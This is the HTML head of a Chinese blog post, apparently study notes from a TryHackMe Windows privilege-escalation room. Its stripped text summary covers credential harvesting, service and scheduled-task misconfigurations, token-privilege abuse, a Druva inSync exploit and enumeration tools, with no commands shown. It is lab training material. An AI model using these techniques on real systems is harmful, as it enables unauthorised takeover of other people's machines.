<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>THM-Windows权限提升 | hybcx</title><meta name="keywords" content="TryHackMe"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="THM-Windows权限提升"><meta name="application-name" content="THM-Windows权限提升"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="THM-Windows权限提升"><meta property="og:url" content="http://hybcx.xyz/2024/02/06/thm-windows-quan-xian-ti-sheng/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 前言 最近在tryhackme中学到了Windows渗透相关知识，在此之前学的有些东西忘记记录了，但实际上也没有记录的必要性，故此不管了。这里就记录Windows提权的某些知识点。 0x02 简介 简而言之，权限升级包括使用“用户 A”对主机的给定访问权限，并通过滥用目标系统中的弱点来利用"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 前言 最近在tryhackme中学到了Windows渗透相关知识，在此之前学的有些东西忘记记录了，但实际上也没有记录的必要性，故此不管了。这里就记录Windows提权的某些知识点。 0x02 简介 简而言之，权限升级包括使用“用户 A”对主机的给定访问权限，并通过滥用目标系统中的弱点来利用"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/02/06/thm-windows-quan-xian-ti-sheng/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'THM-Windows权限提升',
  postAI: '',
  pageFillDescription: '0x01 前言, 0x02 简介, 0x03 Windows用户, 0x03 Windows密码收集, 3.1 Windows installations, 3.2 Powershell History, 3.3 Windows Credentials, 3.4 IIS Configuration, 3.5 从软件检索凭证：PuTTY, 0x04 权限提升, 4.1 Scheduled Tasks -计划任务, 4.2 AlwaysInstallElevated -始终安装提升, 4.3 Windows Services, 4.4 服务可执行文件的不安全权限, 4.5 未加引号的服务路径, 4.6 不安全的服务权限, tips, 4.7 SeBackup / SeRestore, 4.8 SeTakeOwnership, 4.9 SeImpersonate / SeAssignPrimaryToken, 4.10 未打补丁的软件, Example：Druva inSync 6.6.3, 0x05 自动化工具, 5.1 WinPEAS, 5.2 PrivescCheck, 5.3 WES-NG, 5.4 Metasploit 元分析软件前言最近在中学到了渗透相关知识在此之前学的有些东西忘记记录了但实际上也没有记录的必要性故此不管了这里就记录提权的某些知识点简介简而言之权限升级包括使用用户对主机的给定访问权限并通过滥用目标系统中的弱点来利用它来获得对用户的访问权限虽然我们通常希望用户拥有管理权限但在某些情况下我们可能需要升级到其他非特权帐户然后才能真正获得管理权限获得对不同帐户的访问权限就像在一些粗心的用户留下的不安全的文本文件或电子表格中查找凭据一样简单但情况并非总是如此根据具体情况我们可能需要利用以下一些弱点服务或计划任务配置错误分配给我们帐户的权限过多易受攻击的软件缺少安全补丁在开始讨论实际技术之前让我们先了解一下系统上的不同帐户类型用户系统主要有两类用户根据用户的访问级别我们可以将用户分为以下组之一管理员这些用户拥有最多的权限他们可以更改任何系统配置参数并访问系统中的任何文件标准用户这些用户可以访问计算机但只能执行有限的任务通常这些用户无法对系统进行永久或重要的更改并且仅限于他们的文件任何具有管理权限的用户都将成为管理员组的一部分另一方面标准用户是用户组的一部分除此之外您通常会听说操作系统在权限升级的情况下使用一些特殊的内置帐户系统本地系统操作系统用来执行内部任务的帐户它可以完全访问主机上可用的所有文件和资源并且具有比管理员更高的权限本地服务用于以最低权限运行服务的默认帐户它将使用网络上的匿名连接网络服务用于以最低权限运行服务的默认帐户它将使用计算机凭据通过网络进行身份验证这些帐户由创建和管理您将无法像其他常规帐户一样使用它们不过在某些情况下您可能会因为利用特定服务而获得他们的特权密码收集获得其他用户访问权限的最简单方法是从受感染的计算机收集凭据此类凭证的存在可能有多种原因包括粗心的用户将其留在明文文件中甚至由浏览器或电子邮件客户端等软件存储在大量主机上安装时管理员可以使用部署服务该服务允许通过网络将单个操作系统映像部署到多台主机此类安装称为无人值守安装因为它们不需要用户交互此类安装需要使用管理员帐户来执行初始设置该设置最终可能存储在计算机中的以下位置作为这些文件的一部分您可能会遇到凭据每当用户使用运行命令时它都会存储到一个文件中该文件会保留过去的命令这对于快速重复之前使用过的命令很有用如果用户直接在命令行中运行包含密码的命令则稍后可以在提示符下使用以下命令来检索该密码注意上面的命令只能在中运行因为不会将识别为环境变量要从读取文件您必须将替换为允许我们使用其他用户的凭据此功能还提供了将这些凭据保存在系统上的选项下面的命令将列出保存的凭据虽然您看不到实际的密码但如果您发现任何值得尝试的凭据则可以将它们与命令和选项一起使用如下所示上述的可分别用对应的值替换信息服务是安装上的默认服务器上网站的配置存储在名为的文件中并且可以存储数据库的密码或配置的身份验证机制根据安装的版本我们可以在以下位置之一找到这是在文件上查找数据库连接字符串的快速方法从软件检索凭证是系统上常见的客户端用户不必每次都指定连接参数而是可以存储会话其中可以存储用户和其他配置以供以后使用虽然不允许用户存储其密码但它将存储包含明文身份验证凭据的代理配置要检索存储的代理凭据您可以使用以下命令在以下注册表项下搜索注意是的创建者他的名字是路径的一部分而不是我们要检索密码的用户名运行上述命令后存储的代理用户名也应该可见正如存储凭据一样任何存储密码的软件包括浏览器电子邮件客户端客户端客户端软件等都将有方法恢复用户保存的任何密码权限提升计划任务查看目标系统上的计划任务您可能会看到计划任务丢失了其二进制文件或正在使用您可以修改的二进制文件可以使用不带任何选项的命令从命令行列出计划任务要检索有关任何服务的详细信息您可以使用如下命令可以使用不带任何选项的命令从命令行列出计划任务要检索有关任何服务的详细信息您可以使用如下命令您将获得有关该任务的大量信息但对我们来说重要的是参数该参数指示计划任务执行的内容以及参数该参数显示将使用的用户执行任务如果我们当前的用户可以修改或覆盖要运行的任务可执行文件我们就可以控制用户执行的内容从而实现简单的权限提升要检查可执行文件的文件权限我们使用从结果中可以看出组对任务的二进制文件具有完全访问权限这意味着我们可以修改文件并插入我们喜欢的任何有效负载为了您的方便可以在上找到让我们更改文件以生成反向然后我们在攻击者机器上启动一个侦听器该侦听器位于我们在反向上指示的同一端口上下次运行计划任务时您应该会收到具有权限的反向虽然您可能无法在实际场景中启动任务而必须等待计划任务触发但我们为您的用户提供了手动启动任务的权限以节省您的时间我们可以使用以下命令运行该任务您将按预期收到具有权限的反向始终安装提升安装程序文件也称为文件用于在系统上安装应用程序它们通常以启动它的用户的权限级别运行但是可以将它们配置为从任何用户帐户甚至是非特权帐户以更高的权限运行这可能会让我们生成一个以管理员权限运行的恶意文件注意方法在此房间的计算机上不起作用它仅供参考此方法需要设置两个注册表值您可以使用以下命令从命令行查询这些内容为了能够利用此漏洞两者都应该设置否则利用将是不可能的如果设置了这些您可以使用生成恶意文件如下所示由于这是一个反向您还应该运行相应配置的处理程序模块传输创建的文件后您可以使用以下命令运行安装程序并接收反向服务由服务控制管理器管理是一个负责根据需要管理服务状态检查任何给定服务的当前状态并通常提供配置服务的方法的进程计算机上的每个服务都有一个关联的可执行文件每当服务启动时都会运行该可执行文件需要注意的是服务可执行文件实现特殊功能以便能够与通信因此任何可执行文件都不能作为服务成功启动每个服务还指定该服务将在其下运行的用户帐户为了更好地理解服务的结构让我们使用命令检查服务配置在这里我们可以看到关联的可执行文件是通过参数指定的用于运行服务的帐户显示在参数上服务有一个自主访问控制列表它指示谁有权启动停止暂停查询状态查询配置或重新配置服务以及其他权限可以从中看到可以在您的计算机桌面上找到所有服务配置都存储在注册表中的下系统中的每个服务都存在一个子项同样我们可以在值上看到关联的可执行文件并在值上看到用于启动服务的帐户如果已为该服务配置了它将存储在名为的子项中正如您现在已经猜到的默认情况下只有管理员可以修改此类注册表项服务可执行文件的不安全权限如果与服务关联的可执行文件的权限较弱允许攻击者修改或替换它则攻击者可以轻松获得该服务帐户的权限为了了解其工作原理让我们看一下上发现的漏洞首先我们将使用查询服务配置我们可以看到漏洞软件安装的服务以身份运行与该服务关联的可执行文件位于中然后我们继续检查可执行文件的权限这里有一些有趣的事情组对服务的可执行文件具有修改权限这意味着我们可以简单地用我们偏好的任何有效负载覆盖它并且该服务将使用配置的用户帐户的权限执行它让我们使用生成一个负载并通过服务器提供它然后我们可以使用以下命令从中提取有效负载一旦有效负载位于服务器中我们就继续用有效负载替换服务可执行文件由于我们需要另一个用户来执行我们的有效负载因此我们还希望向组授予完全权限我们在攻击者机器上启动一个反向侦听器最后重新启动服务虽然在正常情况下您可能需要等待服务重新启动但您已被分配了自行重新启动服务的权限以节省一些时间从命令提示符使用以下命令注意将作为的别名因此您需要使用才能以这种方式使用控制服务结果您将获得具有权限的反向未加引号的服务路径当我们无法像以前一样直接写入服务可执行文件时仍然有机会通过使用相当模糊的功能来强制服务运行任意可执行文件使用服务时当服务配置为指向未加引号的可执行文件时会出现非常特殊的行为不加引号是指未正确引用关联可执行文件的路径以解决命令中的空格问题作为示例让我们看一下两个服务之间的区别这些服务仅用作示例可能在您的计算机中不可用第一个服务将使用正确的引用以便毫无疑问地知道它必须执行指向的二进制文件后跟给定的参数请记住将作为的别名因此如果您处于提示符中则需要使用来控制服务现在让我们看看另一项没有正确报价的服务当尝试执行关联的二进制文件时就会出现问题由于文件夹的名称上有空格因此该命令变得不明确并且不知道您正在尝试执行以下哪一个这与命令提示符如何解析命令有关通常当您发送命令时空格将用作参数分隔符除非它们是带引号的字符串的一部分这意味着未加引号的命令的正确解释是执行并将其余部分作为参数没有像它可能应该发生的那样失败而是尝试帮助用户并开始按照表中所示的顺序搜索每个二进制文件首先搜索如果存在该服务将运行此可执行文件如果后者不存在它将搜索如果存在该服务将运行此可执行文件如果后者不存在它将搜索此选项预计会成功并且通常会在默认安装中运行从这个行为来看问题就显而易见了如果攻击者创建了在预期服务可执行文件之前搜索的任何可执行文件他们就可以强制服务运行任意可执行文件虽然这听起来微不足道但默认情况下大多数服务可执行文件将安装在或下非特权用户无法写入这可以防止任何易受攻击的服务被利用此规则也有例外某些安装程序更改已安装文件夹的权限使服务容易受到攻击管理员可能决定将服务二进制文件安装在非默认路径中如果这样的路径是全局可写的则该漏洞可以被利用在我们的例子中管理员在下安装了磁盘排序器二进制文件默认情况下它继承目录的权限允许任何用户在其中创建文件和文件夹我们可以使用来检查组拥有和权限分别允许用户创建子目录和文件使用创建并将其传输到目标主机的过程与以前相同因此请像以前一样创建以下并将其上传到服务器我们还将启动一个侦听器来接收反向执行时的情况一旦有效负载进入服务器请将其移动到可能发生劫持的任何位置在这种情况下我们将把有效负载移动到我们还将授予每个人对该文件的完全权限以确保该服务可以执行该文件服务重新启动后您的有效负载应该执行结果您将获得具有权限的反向不安全的服务权限如果服务的可执行配置良好并且正确引用了服务的二进制路径那么您仍然有机会利用该服务如果服务不是服务的可执行允许您修改服务的配置您将能够重新配置该服务这将允许您指向所需的任何可执行文件并使用您喜欢的任何帐户运行它包括本身要从命令行检查服务您可以使用套件中的为了您的方便可在获取副本检查服务的命令是这里我们可以看到组拥有权限这意味着任何用户都可以重新配置服务在更改服务之前让我们构建另一个反向并在攻击者的计算机上启动它的侦听器然后我们将反向可执行文件传输到目标机器并将其存储在中请随意使用传输您的可执行文件并将其移动到所需的位置请记住授予每个人执行您的有效负载的权限要更改服务关联的可执行文件和帐户我们可以使用以下命令使用时请注意等号后面的空格请注意我们可以使用任何帐户来运行该服务我们选择因为它是可用的最高特权帐户要触发我们的有效负载剩下的就是重新启动服务我们将在攻击者的机器上收到一个具有系统权限的权限是帐户执行特定系统相关任务所拥有的权利这些任务可以像关闭计算机的权限一样简单也可以像绕过某些基于的访问控制的权限一样简单每个用户都有一组分配的权限可以使用以下命令进行检查此处提供了系统上可用权限的完整列表从攻击者的角度来看只有那些允许我们在系统中升级的权限才有意义您可以在项目上找到可利用权限的完整列表虽然我们不会逐一查看但我们将展示如何滥用您可以找到的一些最常见的特权和权限允许用户读取和写入系统中的任何文件忽略任何此权限背后的想法是允许某些用户从系统执行备份而无需完全管理权限有了这种能力攻击者可以使用多种技术轻松提升系统权限我们将研究的方法包括复制和注册表配置单元以提取本地管理员的密码哈希值接下来实操的帐户属于组默认情况下被授予和权限我们需要使用以管理员身份打开选项打开命令提示符才能使用这些权限我们将被要求再次输入密码以获得提升的控制台进入命令提示符后我们可以使用以下命令检查我们的权限要备份和哈希值我们可以使用以下命令这将创建几个包含注册表配置单元内容的文件现在我们可以使用或任何其他可用方法将这些文件复制到攻击者计算机对于我们可以使用的在的当前目录中启动一个带有网络共享的简单服务器这将创建一个名为的共享指向目录该目录需要当前会话的用户名和密码之后我们可以在机器中使用命令将这两个文件传输到并使用检索用户的密码哈希值我们终于可以使用管理员的哈希来执行哈希传递攻击并获得具有系统权限的目标计算机的访问权限权限允许用户获取系统上任何对象的所有权包括文件和注册表项这为攻击者提升权限提供了多种可能性例如我们可以搜索作为运行的服务并获取所有权服务的可执行文件然而对于这项任务我们将采取不同的路线要获得权限我们需要使用以管理员身份打开选项打开命令提示符我们将被要求输入密码以获得提升的控制台进入命令提示符后我们可以使用以下命令检查我们的权限这次我们将滥用来升级权限是一个内置的应用程序用于在锁定屏幕期间提供轻松访问选项由于是以权限运行的因此如果我们将原始二进制文件替换为我们喜欢的任何有效负载我们将有效地获得权限由于我们可以拥有任何文件的所有权因此替换它是微不足道的要替换我们将首先使用以下命令获取它的所有权请注意成为文件的所有者并不一定意味着您拥有该文件的权限但作为所有者您可以为自己分配所需的任何权限要为您的用户授予的完全权限您可以使用以下命令之后我们将用的副本替换要触发我们将从开始按钮锁定屏幕最后继续单击轻松访问按钮该按钮将以系统权限运行由于我们将其替换为副本因此我们将获得具有权限的命令提示符这些权限允许进程模拟其他用户并代表他们执行操作模拟通常包括能够在另一个用户的安全上下文下生成进程或线程当您考虑服务器的工作原理时就很容易理解模拟服务器必须限制用户只能访问他们应该被允许查看的文件假设我们有一个使用用户运行的服务在没有模拟的情况下如果用户登录服务器并尝试访问她的文件服务将尝试使用其访问令牌而不是的访问令牌来访问它们使用令牌不是最好的主意有以下几个原因为了正确提供文件用户需要可以访问它们在上面的示例中服务将能够访问的文件但不能访问的文件因为文件中的不允许用户这增加了复杂性因为我们必须为每个提供的文件目录手动配置特定权限对于操作系统所有文件均由用户访问与当前登录服务的用户无关这使得无法将授权委托给操作系统因此服务必须实现它如果服务在某个时刻遭到破坏攻击者将立即获得对用户有权访问的所有文件夹的访问权限另一方面如果服务的用户具有或权限则所有这些都会稍微简化因为服务可以临时获取登录用户的访问令牌并使用它来执行其上的任何任务代表现在如果用户登录到服务并且考虑到用户具有模拟权限则它可以借用的访问令牌并使用它来访问她的文件这样文件不需要以任何方式向用户提供访问权限并且操作系统会处理授权由于服务正在冒充因此在该会话期间它将无法访问或的文件作为攻击者如果我们设法控制具有或权限的进程我们就可以模拟连接该进程并对其进行身份验证的任何用户在系统中你会发现和已经拥有这样的权限由于这些帐户用于使用受限帐户生成服务因此如果服务需要允许它们模拟连接用户是有意义的信息服务还将为应用程序创建一个名为的类似默认帐户要使用此类帐户提升权限攻击者需要满足以下条件生成一个进程以便用户可以连接该进程并对其进行身份验证以进行模拟找到一种方法来强制特权用户连接并验证生成的恶意进程我们将使用漏洞来实现这两个条件首先假设我们已经入侵了一个在上运行的网站并且我们已经在以下地址植入了我们可以使用检查受感染帐户的分配权限并确认我们拥有此任务感兴趣的两项权限要使用我们首先需要将漏洞利用程序上传到目标机器为了您的方便这已经完成您可以在文件夹中找到该漏洞漏洞利用是可能的因为每当用户包括非特权用户在中启动服务时它都会使用系统权限自动创建到端口的连接端口通常用于服务它只是一个公开控制台以通过网络远程使用的端口可以将其想象为但使用如果由于某种原因服务没有在受害服务器上运行则攻击者可以在端口上启动伪造的服务并在启动时捕获服务进行的身份验证尝试如果攻击者具有权限他可以代表连接用户即执行任何命令在运行漏洞之前我们将启动一个侦听器以在攻击者的计算机上接收反向然后使用我们的使用以下命令触发漏洞利用注意该漏洞可能需要长达分钟才能发挥作用因此您的浏览器可能会出现一段时间无响应如果您多次运行漏洞利用程序就会发生这种情况因为它必须等待服务停止才能再次启动服务将在启动分钟后自动停止参数指定漏洞利用程序运行的可执行文件在本例中为参数用于将参数传递给可执行文件由于我们希望针对攻击者机器建立反向因此传递给的参数将为如果一切设置正确您应该会得到一个具有权限的未打补丁的软件目标系统上安装的软件可以提供各种权限升级机会与驱动程序一样组织和用户可能不会像更新操作系统那样频繁地更新它们您可以使用工具列出目标系统上安装的软件及其版本下面的命令将转储它可以在已安装的软件上收集的信息可能需要大约一分钟才能完成请记住命令可能不会返回所有已安装的程序根据某些程序的安装方式它们可能不会在此处列出检查桌面快捷方式可用服务或任何表明存在可能易受攻击的其他软件的痕迹始终是值得的一旦我们收集了产品版本信息我们就可以随时在和等网站上在线搜索已安装软件的现有漏洞目标服务器正在运行据报告该服务器容易受到权限升级的影响该漏洞是由于对最初针对版本报告的另一个漏洞应用了错误补丁而导致的该软件容易受到攻击因为它以系统权限在端口上运行远程过程调用服务器只能从本地主机访问如果您不熟悉它只是一种允许给定进程通过网络公开函数行话中称为过程的机制以便其他计算机可以远程调用它们对于端口上公开的过程之一特别是过程号允许任何人请求执行任何命令由于服务器以身份运行因此任何命令都以权限执行及更早版本中报告的原始漏洞允许不受限制地运行任何命令提供此类功能的最初想法是远程执行提供的一些特定二进制文件而不是任何命令尽管如此仍然没有进行任何检查来确保这一点发布了一个补丁他们决定检查执行的命令是否以字符串开头这是允许的二进制文件应该在的地方但是事实证明这还不够因为您可以简单地进行路径遍历攻击来绕过这种控制假设你要执行它不在允许的路径中您只需要求服务器运行即可成功绕过检查为了构建一个可行的漏洞利用程序我们需要了解如何与端口通信幸运的是我们使用的协议很简单要发送的数据包如下图所示第一个数据包只是一个包含固定字符串的数据包第二个数据包表明我们想要执行程序因为这是一个易受攻击的程序它将为我们执行任何命令最后两个数据包分别用于发送命令的长度和要执行的命令字符串最初由在此发布可以在目标计算机中使用以下漏洞来提升权限并检索此任务的标志为了您的方便以下是原始漏洞利用代码您可以弹出控制台并直接粘贴漏洞来执行它该漏洞也可以在目标计算机中的中找到请注意在变量中指定的漏洞利用的默认负载将在系统中创建一个名为的用户但不会为其分配管理权限因此我们可能想要更改有效负载以获得更有用的东西对于这个房间我们将更改有效负载以运行以下命令这将创建密码为的用户并将其添加到管理员组中如果利用成功您应该能够运行以下命令来验证用户是否存在并且属于管理员组命令提示符最后一步您可以以管理员身份运行命令提示符自动化工具有几个脚本可以以类似于上一个任务中看到的方式进行系统枚举这些工具可以缩短枚举过程时间并发现不同的潜在特权升级向量但是请记住自动化工具有时可能会错过权限升级以下是一些常用于识别权限升级向量的工具请随意针对这个房间中的任何机器运行它们看看结果是否与讨论的攻击向量相匹配是一个开发用于枚举目标系统以发现权限提升路径的脚本您可以找到有关的更多信息并下载预编译的可执行文件或脚本将运行与上一个任务中列出的命令类似的命令并打印其输出的输出可能很长有时难以阅读这就是为什么最好始终将输出重定向到文件如下所示可在此处下载是一个脚本用于搜索目标系统上的常见权限升级它提供了的替代方案无需执行二进制文件可在此处下载提醒要在目标系统上运行您可能需要绕过执行策略限制为此您可以使用如下所示一些漏洞利用建议脚本例如将要求您将它们上传到目标系统并在那里运行它们这可能会导致防病毒软件检测并删除它们为了避免发出不必要的噪音来吸引注意力您可能更喜欢使用它将在您的攻击机器上运行例如或是一个脚本可以在此处找到并下载安装后在使用之前请键入命令来更新数据库该脚本将引用它创建的数据库来检查是否有缺失的补丁这些补丁可能会导致您可以利用漏洞来提升您在目标系统上的权限要使用该脚本您需要在目标系统上运行命令不要忘记将输出定向到您需要移动到攻击计算机的文件完成后可以按如下方式运行元分析软件如果目标系统上已有则可以使用模块列出可能影响目标系统的漏洞并允许您提升目标系统上的权限',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-02-06 12:29:42',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
